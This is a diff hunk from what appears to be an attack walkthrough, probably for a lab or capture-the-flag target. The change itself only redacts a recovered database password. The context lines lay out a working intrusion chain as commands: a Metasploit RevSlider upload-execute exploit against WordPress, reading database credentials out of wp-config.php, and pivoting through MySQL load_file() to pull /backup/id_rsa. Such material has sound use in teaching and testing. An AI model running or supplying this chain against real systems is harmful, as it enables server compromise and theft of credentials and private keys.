@@ -338,10 +338,10 @@ msfconsole -q -x "use exploit/unix/webapp/wp_revslider_upload_execute; \
 
 # 2. From the meterpreter shell, steal DB creds from wp-config.php
 cat /var/www/wp-config.php | grep -E "DB_(NAME|USER|PASSWORD|HOST)"
-# -> DB_USER='wordpress', DB_PASSWORD='0NYa6PBH52y86C', DB_HOST='172.30.0.2'
+# -> DB_USER='wordpress', DB_PASSWORD='<recovered-db-password>', DB_HOST='172.30.0.2'
 
 # 3. Pivot: connect as the DB user and read any world-readable file with load_file()
-mysql -h 172.30.0.2 -u wordpress --password='0NYa6PBH52y86C' \
+mysql -h 172.30.0.2 -u wordpress --password \
       -e "SELECT load_file('/backup/id_rsa')"
 #   (requires FILE privilege, granted to the WP user on older default stacks)
 
